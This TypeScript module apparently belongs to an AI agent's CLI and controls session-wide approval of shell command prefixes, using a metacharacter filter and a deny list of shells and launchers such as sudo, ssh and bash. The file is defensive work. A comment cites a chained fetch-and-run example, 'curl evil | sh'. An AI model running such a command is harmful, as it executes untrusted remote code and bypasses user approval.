/**
 * Session-scoped approval of simple shell command prefixes. Kept dependency-free so the CLI can
 * import it without loading the tool registry.
 */
// Anything that can chain, substitute, redirect or group commands disqualifies a command from
// prefix approval: "npm test; curl evil | sh" must never ride on an approved "npm test".
const SHELL_META_RE = /[;&|`$<>(){}\\\n\r]/;
const LAUNCHER_SUBCOMMANDS = new Set(['run', 'exec', 'x', 'dlx', '-m']);
// Commands that run other commands or rewrite their environment: never approvable by prefix.
const ALWAYS_EXPLICIT = new Set([
  'env', 'sudo', 'doas', 'su', 'xargs', 'eval', 'exec', 'command', 'builtin', 'source', '.', 'nohup',
  'time', 'nice', 'timeout', 'watch', 'ssh', 'find', 'bash', 'sh', 'zsh', 'fish', 'dash', 'pwsh', 'powershell',
]);
// Interpreters may be approved for a specific script/module ("python -m pytest", "node build.js"),
// never as a bare single-word prefix that would cover any flag combination.
const INTERPRETERS = new Set(['python', 'python3', 'node', 'deno', 'bun', 'ruby', 'perl', 'php', 'awk', 'sed', 'git']);

function commandTokens(input: unknown): string[] | undefined {
  const command = input && typeof input === 'object' ? (input as { command?: unknown }).command : undefined;
  if (typeof command !== 'string') return undefined;
  const trimmed = command.trim();
  if (!trimmed || SHELL_META_RE.test(trimmed) || /["']/.test(trimmed)) return undefined;
  return trimmed.split(/\s+/);
}

/**
 * The command prefix a user can approve once for the rest of the session ("npm test",
 * "npm run lint", "python -m pytest", "git status"). Undefined for compound or unusual commands,
 * which always need an explicit decision.
 */
export function bashApprovalPrefix(input: unknown): string | undefined {
  const tokens = commandTokens(input);
  if (!tokens?.length || tokens[0].includes('=') || ALWAYS_EXPLICIT.has(tokens[0])) return undefined;
  const take = tokens.length > 2 && LAUNCHER_SUBCOMMANDS.has(tokens[1]) ? 3 : tokens.length > 1 && !tokens[1].startsWith('-') ? 2 : 1;
  if (take === 1 && INTERPRETERS.has(tokens[0])) return undefined;
  return tokens.slice(0, take).join(' ');
}

/** True when the command is a simple command that starts, token by token, with an approved prefix. */
export function isApprovedBashPrefix(input: unknown, prefixes: ReadonlySet<string>): boolean {
  if (!prefixes.size) return false;
  const tokens = commandTokens(input);
  if (!tokens?.length || tokens[0].includes('=') || ALWAYS_EXPLICIT.has(tokens[0])) return false;
  for (const prefix of prefixes) {
    const wanted = prefix.split(' ');
    if (wanted.length <= tokens.length && wanted.every((t, i) => tokens[i] === t)) return true;
  }
  return false;
}
